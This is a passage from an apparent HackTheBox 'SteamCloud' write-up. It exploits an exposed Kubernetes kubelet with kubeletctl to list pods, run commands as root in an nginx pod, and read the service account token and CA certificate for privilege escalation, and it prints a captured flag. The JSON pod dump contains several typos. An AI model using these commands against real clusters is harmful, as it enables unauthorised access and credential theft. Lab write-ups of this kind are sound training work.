f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:securityContext":{".":{},"f:privileged":{}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/lib/modules\"}":{".":{},"f:mountPath":{},"f:name":{},"f:readOnly":{}},"k:{\"mountPath\":\"/run/xtables.lock\"}":{".":{},"f:mountPath":{},"f:name":{}},"k:{\"mountPath\":\"/var/lib/kube-proxy\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:hostNetwork":{},"f:nodeSelector":{},"f:priorityClassName":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:serviceAccount":{},"f:serviceAccountName":{},"f:terminationGracePeriodSeconds":{},"f:tolerations":{},"f:volumes":{".":{},"k:{\"name\":\"kube-proxy\"}":{".":{},"f:configMap":{".":{},"f:defaultMode":{},"f:name":{}},"f:name":{}},"k:{\"name\":\"lib-modules\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}},"k:{\"name\":\"xtables-lock\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}}}}}}]},"spec":{"volumes":[{"name":"kube-proxy","configMap":{"name":"kube-proxy","defaultMode":420}},{"name":"xtables-lock","hostPath":{"path":"/run/xtables.lock","type":"FileOrCreate"}},{"name":"lib-modules","hostPath":{"path":"/lib/modules","type":""}},{"name":"kube-api-access-qbw6g","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"kube-proxy","image":"k8s.gcr.io/kube-proxy:v1.22.3","command":["/usr/local/bin/kube-proxy","--config=/var/lib/kube-proxy/config.conf","--hostname-override=$(NODE_NAME)"],"env":[{"name":"NODE_NAME","valueFrom":{"fieldRef":{"apiVersion":"v1","fieldPath":"spec.nodeName"}}}],"resources":{},"volumeMounts":[{"name":"kube-proxy","mountPath":"/var/lib/kube-proxy"},{"name":"xtables-lock","mountPath":"/run/xtables.lock"},{"name":"lib-modules","readOnly":true,"mountPath":"/lib/modules"},{"name":"kube-api-access-qbw6g","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","nodeSelector":{"kubernetes.io/os":"linux"},"serviceAccountName":"kube-proxy","serviceAccount":"kube-proxy","nodeName":"steamcloud","hostNetwork":true,"securityContext":{},"affinity":{"nodeAffinity":{"requiredDuringSchedulingIgnoredDuringExecution":{"nodeSelectorTerms":[{"matchFields":[{"key":"metadata.name","operator":"In","values":["steamcloud"]}]}]}}},"schedulerName":"default-scheduler","tolerations":[{"operator":"Exists"},{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute"},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute"},{"key":"node.kubernetes.io/disk-pressure","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/memory-pressure","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/pid-pressure","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/unschedulable","operator":"Exists","effect":"NoSchedule"},{"key":"node.kubernetes.io/network-unavailable","operator":"Exists","effect":"NoSchedule"}],"priorityClassName":"system-node-critical","priority":2000001000,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:14Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:16Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:16Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:14Z"}],"hostIP":"10.10.11.133","podIP":"10.10.11.133","podIPs":[{"ip":"10.10.11.133"}],"startTime":"2023-09-04T10:39:14Z","containerStatuses":[{"name":"kube-proxy","state":{"running":{"startedAt":"2023-09-04T10:39:15Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"k8s.gcr.io/kube-proxy:v1.22.3","imageID":"docker-pullable://k8s.gcr.io/kube-proxy@sha256:8d0561b2e5d0ccb9c49a25e7b415bef12637a07a872703dc252c2de3b458fc4f","containerID":"docker://9c32ce67812a9a7ea48c85275eb42eb217319fac43aad5dbecc448480e26520f","started":true}],"qosClass":"BestEffort"}},{"metadata":{"name":"coredns-78fcd69978-s62vt","generateName":"coredns-78fcd69978-","namespace":"kube-system","uid":"261d62a4-0145-423b-9637-68fb11ee7809","resourceVersion":"448","creationTimestamp":"2023-09-04T10:39:15Z","labels":{"k8s-app":"kube-dns","pod-template-hash":"78fcd69978"},"annotations":{"kubernetes.io/config.seen":"2023-09-04T06:39:15.086230641-04:00","kubernetes.io/config.source":"api"},"ownerReferences":[{"apiVersion":"apps/v1","kind":"ReplicaSet","name":"coredns-78fcd69978","uid":"9834d940-824a-4262-b730-ca005bc663b6","controller":true,"blockOwnerDeletion":true}],"managedFields":[{"manager":"kube-controller-manager","operation":"Update","apiVersion":"v1","time":"2023-09-04T10:39:15Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:generateName":{},"f:labels":{".":{},"f:k8s-app":{},"f:pod-template-hash":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"9834d940-824a-4262-b730-ca005bc663b6\"}":{}}},"f:spec":{"f:containers":{"k:{\"name\":\"coredns\"}":{".":{},"f:args":{},"f:image":{},"f:imagePullPolicy":{},"f:livenessProbe":{".":{},"f:failureThreshold":{},"f:httpGet":{".":{},"f:path":{},"f:port":{},"f:scheme":{}},"f:initialDelaySeconds":{},"f:periodSeconds":{},"f:successThreshold":{},"f:timeoutSeconds":{}},"f:name":{},"f:ports":{".":{},"k:{\"containerPort\":53,\"protocol\":\"TCP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}},"k:{\"containerPort\":53,\"protocol\":\"UDP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}},"k:{\"containerPort\":9153,\"protocol\":\"TCP\"}":{".":{},"f:containerPort":{},"f:name":{},"f:protocol":{}}},"f:readinessProbe":{".":{},"f:failureThreshold":{},"f:httpGet":{".":{},"f:path":{},"f:port":{},"f:scheme":{}},"f:periodSeconds":{},"f:successThreshold":{},"f:timeoutSeconds":{}},"f:resources":{".":{},"f:limits":{".":{},"f:memory":{}},"f:requests":{".":{},"f:cpu":{},"f:memory":{}}},"f:securityContext":{".":{},"f:allowPrivilegeEscalation":{},"f:capabilities":{".":{},"f:add":{},"f:drop":{}},"f:readOnlyRootFilesystem":{}},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/etc/coredns\"}":{".":{},"f:mountPath":{},"f:name":{},"f:readOnly":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:nodeSelector":{},"f:priorityClassName":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:serviceAccount":{},"f:serviceAccountName":{},"f:terminationGracePeriodSeconds":{},"f:tolerations":{},"f:volumes":{".":{},"k:{\"name\":\"config-volume\"}":{".":{},"f:configMap":{".":{},"f:defaultMode":{},"f:items":{},"f:name":{}},"f:name":{}}}}}}]},"spec":{"volumes":[{"name":"config-volume","configMap":{"name":"coredns","items":[{"key":"Corefile","path":"Corefile"}],"defaultMode":420}},{"name":"kube-api-access-d65n9","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"coredns","image":"k8s.gcr.io/coredns/coredns:v1.8.4","args":["-conf","/etc/coredns/Corefile"],"ports":[{"name":"dns","containerPort":53,"protocol":"UDP"},{"name":"dns-tcp","containerPort":53,"protocol":"TCP"},{"name":"metrics","containerPort":9153,"protocol":"TCP"}],"resources":{"limits":{"memory":"170Mi"},"requests":{"cpu":"100m","memory":"70Mi"}},"volumeMounts":[{"name":"config-volume","readOnly":true,"mountPath":"/etc/coredns"},{"name":"kube-api-access-d65n9","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"livenessProbe":{"httpGet":{"path":"/health","port":8080,"scheme":"HTTP"},"initialDelaySeconds":60,"timeoutSeconds":5,"periodSeconds":10,"successThreshold":1,"failureThreshold":5},"readinessProbe":{"httpGet":{"path":"/ready","port":8181,"scheme":"HTTP"},"timeoutSeconds":1,"periodSeconds":10,"successThreshold":1,"failureThreshold":3},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent","securityContext":{"capabilities":{"add":["NET_BIND_SERVICE"],"drop":["all"]},"readOnlyRootFilesystem":true,"allowPrivilegeEscalation":false}}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"Default","nodeSelector":{"kubernetes.io/os":"linux"},"serviceAccountName":"coredns","serviceAccount":"coredns","nodeName":"steamcloud","securityContext":{},"schedulerName":"default-scheduler","tolerations":[{"key":"CriticalAddonsOnly","operator":"Exists"},{"key":"node-role.kubernetes.io/master","effect":"NoSchedule"},{"key":"node-role.kubernetes.io/control-plane","effect":"NoSchedule"},{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute","tolerationSeconds":300},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute","tolerationSeconds":300}],"priorityClassName":"system-cluster-critical","priority":2000000000,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:15Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:21Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:21Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:15Z"}],"hostIP":"10.10.11.133","podIP":"172.17.0.2","podIPs":[{"ip":"172.17.0.2"}],"startTime":"2023-09-04T10:39:15Z","containerStatuses":[{"name":"coredns","state":{"running":{"startedAt":"2023-09-04T10:39:17Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"k8s.gcr.io/coredns/coredns:v1.8.4","imageID":"docker-pullable://k8s.gcr.io/coredns/coredns@sha256:6e5a02c21641597998b4be7cb5eb1e7b02c0d8d23cce4dd09f4682d463798890","containerID":"docker://cb41a914b271797cd4161f304620942eb060852b56e0f860e10efc99779d164c","started":true}],"qosClass":"Burstable"}},{"metadata":{"name":"nginx","namespace":"default","uid":"ba93c39e-c318-428c-a338-8ee427c8eb61","resourceVersion":"510","creationTimestamp":"2023-09-04T10:40:02Z","annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"volumeMounts\":[{\"mountPath\":\"/root\",\"name\":\"flag\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/opt/flag\"},\"name\":\"flag\"}]}}\n","kubernetes.io/config.seen":"2023-09-04T06:40:02.350457866-04:00","kubernetes.io/config.source":"api"},"managedFields":[{"manager":"kubectl-client-side-apply","operation":"Update","apiVersion":"v1","time":"2023-09-04T10:40:02Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:kubectl.kubernetes.io/last-applied-configuration":{}}},"f:spec":{"f:containers":{"k:{\"name\":\"nginx\"}":{".":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/root\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{},"f:volumes":{".":{},"k:{\"name\":\"flag\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}}}}}}]},"spec":{"volumes":[{"name":"flag","hostPath":{"path":"/opt/flag","type":""}},{"name":"kube-api-access-nrd9v","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"nginx","image":"nginx:1.14.2","resources":{},"volumeMounts":[{"name":"flag","mountPath":"/root"},{"name":"kube-api-access-nrd9v","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"Never"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","serviceAccountName":"default","serviceAccount":"default","nodeName":"steamcloud","securityContext":{},"schedulerName":"default-scheduler","tolerations":[{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute","tolerationSeconds":300},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute","tolerationSeconds":300}],"priority":0,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:40:02Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:40:04Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:40:04Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:40:02Z"}],"hostIP":"10.10.11.133","podIP":"172.17.0.3","podIPs":[{"ip":"172.17.0.3"}],"startTime":"2023-09-04T10:40:02Z","containerStatuses":[{"name":"nginx","state":{"running":{"startedAt":"2023-09-04T10:40:03Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"nginx:1.14.2","imageID":"docker-pullable://nginx@sha256:f7988fb6c02e0ce69257d9bd9cf37ae20a60f1df7563c3a2a6abe24160306b8d","containerID":"docker://c520ec1ecaaf1e86f6267fe314ae933c9da60b5bbaa833578a34f1bcd8f2e11d","started":true}],"qosClass":"BestEffort"}},{"metadata":{"name":"etcd-steamcloud","namespace":"kube-system","selfLink":"/api/v1/naespaces/kube-system/pods/etcd-steamcloud","uid":"967b9bee71f2e3cec06ff1dbde2a2a19","creationTimestamp":null,"labels":{"component":"etcd","tier":control-plane"},"annotations":{"kubeadm.kubernetes.io/etcd.advertise-client-urls":"https://10.10.11.133:2379","kubernetes.io/config.hash":"967b9ee71f2e3cec06ff1dbde2a2a19","kubernetes.io/config.seen":"2023-09-04T06:39:06.655931396-04:00","kubernetes.io/config.source":"file"}},"spec":{"voumes":[{"name":"etcd-certs","hostPath":{"path":"/var/lib/minikube/certs/etcd","type":"DirectoryOrCreate"}},{"name":"etcd-data","hostPath":{"path:"/var/lib/minikube/etcd","type":"DirectoryOrCreate"}}],"containers":[{"name":"etcd","image":"k8s.gcr.io/etcd:3.5.0-0","command":["etcd","--advetise-client-urls=https://10.10.11.133:2379","--cert-file=/var/lib/minikube/certs/etcd/server.crt","--client-cert-auth=true","--data-dir=/var/libminikube/etcd","--initial-advertise-peer-urls=https://10.10.11.133:2380","--initial-cluster=steamcloud=https://10.10.11.133:2380","--key-file=/vr/lib/minikube/certs/etcd/server.key","--listen-client-urls=https://127.0.0.1:2379,https://10.10.11.133:2379","--listen-metrics-urls=http://127..0.1:2381","--listen-peer-urls=https://10.10.11.133:2380","--name=steamcloud","--peer-cert-file=/var/lib/minikube/certs/etcd/peer.crt","--peer-cient-cert-auth=true","--peer-key-file=/var/lib/minikube/certs/etcd/peer.key","--peer-trusted-ca-file=/var/lib/minikube/certs/etcd/ca.crt","--proy-refresh-interval=70000","--snapshot-count=10000","--trusted-ca-file=/var/lib/minikube/certs/etcd/ca.crt"],"resources":{"requests":{"cpu":"100m,"memory":"100Mi"}},"volumeMounts":[{"name":"etcd-data","mountPath":"/var/lib/minikube/etcd"},{"name":"etcd-certs","mountPath":"/var/lib/minikub/certs/etcd"}],"livenessProbe":{"httpGet":{"path":"/health","port":2381,"host":"127.0.0.1","scheme":"HTTP"},"initialDelaySeconds":10,"timeoutSecnds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":8},"startupProbe":{"httpGet":{"path":"/health","port":2381,"host":"127.0.0.1""scheme":"HTTP"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":24},"terminationMessageath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"Always","terminationGracePerioSeconds":30,"dnsPolicy":"ClusterFirst","nodeName":"steamcloud","hostNetwork":true,"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}}"schedulerName":"default-scheduler","tolerations":[{"operator":"Exists","effect":"NoExecute"}],"priorityClassName":"system-node-critical","enablServiceLinks":true},"status":{"phase":"Running","conditions":[{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"223-09-04T10:39:04Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:09Z"},{"type":"ContainersReady""status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:09Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lstTransitionTime":"2023-09-04T10:39:04Z"}],"hostIP":"10.10.11.133","podIP":"10.10.11.133","podIPs":[{"ip":"10.10.11.133"}],"startTime":"2023-09-4T10:39:04Z","containerStatuses":[{"name":"etcd","state":{"running":{"startedAt":"2023-09-04T10:38:48Z"}},"lastState":{},"ready":true,"restartCont":0,"image":"k8s.gcr.io/etcd:3.5.0-0","imageID":"docker-pullable://k8s.gcr.io/etcd@sha256:9ce33ba33d8e738a5b85ed50b5080ac746deceed4a7496c55092a7a19ca3b6d","containerID":"docker://37cf6733e7a1e3a1234bb511374e01e8d78d5c290dee1e1da90e25e7deba4c14","started":true}],"qosClass":"Burstable"}}}
```

8. Great! We can list all the pods. But as you can see, it's not easy to read.
9. We can use `kubeletctl` to see it clear.

```
┌──(brandy㉿bread-yolk)-[~]
└─$ kubeletctl --server 10.10.11.133 pods
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ kube-proxy-g2jkm                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ coredns-78fcd69978-s62vt           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
```

10. Great! Anyway, I noticed there's a pod named nginx. Well, nginx is not a kubernetes related pod. Seems it should be our interest.
11. To check whether we can execute command in what pod, we can use **scan rce**.

> COMMAND: kubeletctl --server 10.10.11.133 scan rce

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/95954069-3721-4d1b-98a1-ef758ca9c111)



12. Based from the result, we can execute command at pod **nginx** and pod **kube-proxy-lmgsb**.
13. Let's try to execute **whoami** at pod nginx.

> RESULT

```
┌──(brandy㉿bread-yolk)-[~]
└─$ kubeletctl --server 10.10.11.133 exec "whoami" -p nginx -c nginx                        
root
```

> GETTING THE USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9582e4cc-bae7-462d-beb6-ffeb278a09f2)


> ALTERNATE WAY (getting shell)

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/afa398de-c43c-4b5f-b56a-5f1351eac39c)



## USER FLAG

```
43df52debff39b99e488a3eb7fc41e26
```

14. To get the root flag (which is located at the steamcloud root user), since we're exploiting kubernetes, we can't just do basic reverse shell as usual.
15. We need to create our own service account. We can create higher privileged for our service account.

> WHAT WE NEED --> token & ca.crt.

```
┌──(brandy㉿bread-yolk)-[~]
└─$ kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
eyJhbGciOiJSUzI1NiIsImtpZCI6IlVlZWxSZVRlYUFRTnVSa2JSb21McnBOdGVJMkpkWXN2U0ZHbFdJTmFQdEEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI1MzcyMTIyLCJpYXQiOjE2OTM4MzYxMjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImM5Y2Q4OGIwLTA3ZDYtNDk0Mi1hZjQxLTJkZjZlYzk3OGNmZCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjQ5ZTIwYzJjLTcyYjYtNDMzOC04NDkwLWNkNWYwMWEzMzJiMCJ9LCJ3YXJuYWZ0ZXIiOjE2OTM4Mzk3Mjl9LCJuYmYiOjE2OTM4MzYxMjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.L38Qi686kkEdsl_3U3Hq3VjDN5wVEnzAt21WWJ0cu1wQJer1Kuw90iAUIUoZj_7MbDMeSOm5KIBri92DLqM4B8YztmZLkEqK3sbyrAAOkKc9112wZCHjAe7Epc20QnCyAcQ7CYVHbpCj2V47WakFovKkE-HGUYx0MtARCTG9AMHW4AzbyzmVZGBeiaYQ4MM_u-sQIN6NKuqMsyOEF9S_0samWmtG5ONK39zooTdk-MY_HNye9H0pf3NE-PtLZ6pu7zGfI010Dj0htfZcvVFFnGjvGsH3PCnqW3qJUsac4I4tNkeF-w0r7-uqrXZS-ftkwCNZpnAi76sWH46KYxPw7Q                                                                                                                                                
┌──(brandy㉿bread-yolk)-[~]
└─$ kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
1pRrbLrfNk6DE5S9VSUCAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
BBSpRKCEKbVtRsYEGRwyaVeonBdMCjANBgkqhkiG9w0BAQsFAAOCAQEA0jqg5pUm
lt1jIeLkYT1E6C5xykW0X8mOWzmok17rSMA2GYISqdbRcw72aocvdGJ2Z78X/HyO
DGSCkKaFqJ9+tvt1tRCZZS3hiI+sp4Tru5FttsGy1bV5sa+w/+2mJJzTjBElMJ/+
9mGEdIpuHqZ15HHYeZ83SQWcj0H0lZGpSriHbfxAIlgRvtYBfnciP6Wgcy+YuU/D
xpCJgRAw0IUgK74EdYNZAkrWuSOA0Ua8KiKuhklyZv38Jib3FvAo4JrBXlSjW/R0
JWSyodQkEF60Xh7yd2lRFhtyE8J+h1HeTz4FpDJ7MuvfXfoXxSDQOYNQu09iFiMz
kf2eZIBNMp0TFg==
-----END CERTIFICATE-----
```

16. Let's export the token to a variable and the ca cert to a file named .crt.

```
┌──(brandy㉿bread-yolk)-[~]
└─$ export token="eyJhbGciOiJSUzI1NiIsImtpZCI6IlVlZWxSZVRlYUFRTnVSa2JSb21McnBOdGVJMkpkWXN2U0ZHbFdJTmFQdEEifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzI1MzcyMTIyLCJpYXQiOjE2OTM4MzYxMjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImM5Y2Q4OGIwLTA3ZDYtNDk0Mi1hZjQxLTJkZjZlYzk3OGNmZCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjQ5ZTIwYzJjLTcyYjYtNDMzOC04NDkwLWNkNWYwMWEzMzJiMCJ9LCJ3YXJuYWZ0ZXIiOjE2OTM4Mzk3Mjl9LCJuYmYiOjE2OTM4MzYxMjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.L38Qi686kkEdsl_3U3Hq3VjDN5wVEnzAt21WWJ0cu1wQJer1Kuw90iAUIUoZj_7MbDMeSOm5KIBri92DLqM4B8YztmZLkEqK3sbyrAAOkKc9112wZCHjAe7Epc20QnCyAcQ7CYVHbpCj2V47WakFovKkE-HGUYx0MtARCTG9AMHW4AzbyzmVZGBeiaYQ4MM_u-sQIN6NKuqMsyOEF9S_0samWmtG5ONK39zooTdk-MY_HNye9H0pf3NE-PtLZ6pu7zGfI010Dj0htfZcvVFFnGjvGsH3PCnqW3qJUsac4I4tNkeF-w0r7-uqrXZS-ftkwCNZpnAi76sWH46KYxPw7Q"
```

```
┌──(brandy㉿bread-yolk)-[~]
└─$ kubeletctl --server 10.10.11.133 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTIxMTEyOTEyMTY1NVoXDTMxMTEyODEyMTY1NVowFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAOoa
YRSqoSUfHaMBK44xXLLuFXNELhJrC/9O0R2Gpt8DuBNIW5ve+mgNxbOLTofhgQ0M
HLPTTxnfZ5VaavDH2GHiFrtfUWD/g7HA8aXn7cOCNxdf1k7M0X0QjPRB3Ug2cID7
deqATtnjZaXTk0VUyUp5Tq3vmwhVkPXDtROc7QaTR/AUeR1oxO9+mPo3ry6S2xqG
VeeRhpK6Ma3FpJB3oN0Kz5e6areAOpBP5cVFd68/Np3aecCLrxf2Qdz/d9Bpisll
hnRBjBwFDdzQVeIJRKhSAhczDbKP64bNi2K1ZU95k5YkodSgXyZmmkfgYORyg99o
